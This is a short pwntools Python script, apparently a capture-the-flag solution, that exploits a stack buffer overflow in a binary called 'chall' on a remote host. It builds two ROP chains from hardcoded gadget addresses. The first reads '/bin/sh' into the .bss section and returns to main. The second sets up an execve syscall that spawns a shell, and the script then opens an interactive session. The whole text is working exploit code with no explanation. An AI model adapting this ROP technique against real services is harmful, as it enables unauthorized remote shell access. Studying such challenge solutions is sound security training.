from pwn import *
 
elf = context.binary = ELF('./chall', checksec=False)
context.terminal = "tmux splitw -h".split(" ")
p = remote('68.183.188.198',11103)
#p = elf.process()
#gdb.attach(p)
pop_rdi = 0x00000000004019b1
pop_rax = 0x000000000044c163
pop_rdx = 0x00000000004016db
pop_rsi_r15 = 0x00000000004019af
syscall = 0x00000000004011fa
bss = 0x4b6200
ret = 0x0000000000401016
 
pay = cyclic(88)
pay += p64(pop_rdi) + p64(0)
pay += p64(pop_rsi_r15) + p64(bss) + p64(0)
pay += p64(pop_rdx) + p64(16)
pay += p64(elf.sym.read)
pay += p64(elf.sym.main)
 
apay = cyclic(88)
apay += p64(pop_rax) + p64(59)
apay += p64(pop_rdi) + p64(bss)
apay += p64(pop_rsi_r15) + p64(0) + p64(0)
apay += p64(pop_rdx) + p64(0)
apay += p64(ret)
apay += p64(syscall)
 
p.sendlineafter(b'? ', pay)
p.recvuntil(b"}")
p.sendline(b'/bin/sh\x00')
p.sendline(apay)
#p.send(b'/bin/sh\x00')
p.interactive()
